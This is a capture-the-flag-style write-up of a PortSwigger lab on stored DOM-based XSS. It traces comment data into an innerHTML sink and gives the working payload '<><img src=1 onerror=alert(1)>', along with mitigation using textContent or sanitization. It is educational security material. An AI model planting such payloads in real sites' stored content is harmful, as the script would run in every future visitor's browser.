# Lab10 - Stored DOM XSS

## Objective

Exploit a Stored DOM-Based XSS vulnerability in the blog comment functionality.

Execute:

```javascript
alert(1)
```

when comments are displayed.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Practitioner |
| Vulnerability | Stored DOM XSS |
| Source | Stored Comment |
| Sink | innerHTML |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application stores user comments.

When comments are displayed, client-side JavaScript inserts attacker-controlled data into:

```javascript
innerHTML
```

without sanitization.

---

# Source → Sink Flow

```text
Comment Submission
        ↓
Database Storage
        ↓
Comment Display
        ↓
innerHTML
        ↓
Execution
```

---

# Analysis

## Step 1

Open any blog post.

---

## Step 2

Submit test comment.

Example:

```text
carry123
```

---

## Step 3

Reload page.

---

Observation:

```text
Comment Stored Successfully
```

---

## Step 4

Inspect page JavaScript.

---

Found:

```javascript
innerHTML
```

used to render comments.

---

## Step 5

Determine Context

Comment content eventually reaches:

```javascript
innerHTML
```

---

# Full Payload(s) Used

## Probe Value

```text
carry123
```

---

## Final Payload

```html
<><img src=1 onerror=alert(1)>
```

---

# Why The Payload Works

Application:

```javascript
commentContainer.innerHTML =
comment.author;
```

---

Payload:

```html
<><img src=1 onerror=alert(1)>
```

---

Execution Flow

```text
Stored Comment
        ↓
innerHTML
        ↓
Browser Parses HTML
        ↓
Image Load Fails
        ↓
onerror Fires
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Determine whether comments are:

```text
Stored
```

or

```text
Reflected
```

---

## Probe Test

Used:

```text
carry123
```

---

Confirmed:

```text
Comment Persists After Reload
```

---

## Key Observation

Rendering handled by:

```javascript
innerHTML
```

instead of server-side output.

---

## Exploitation Strategy

Inject HTML that triggers automatically.

Chosen payload:

```html
<><img src=1 onerror=alert(1)>
```

---

Reason:

```text
Works Reliably
Triggers Automatically
Compatible With innerHTML
```

---

## Result

```javascript
alert(1)
```

executed when page loaded.

Lab solved.

---

# Mitigation

Avoid:

```javascript
innerHTML
```

for rendering untrusted content.

Use:

```javascript
textContent
createTextNode()
```

or a sanitization library.

---

# Related Theory

- 20-stored-dom-xss.md
- 21-dom-xss-sinks-cheatsheet.md

---

# Key Learnings

- Stored DOM XSS combines persistence and client-side execution.
- innerHTML remains one of the most common sinks.
- Stored DOM XSS can impact every future visitor.
- Always trace stored data to the final rendering sink.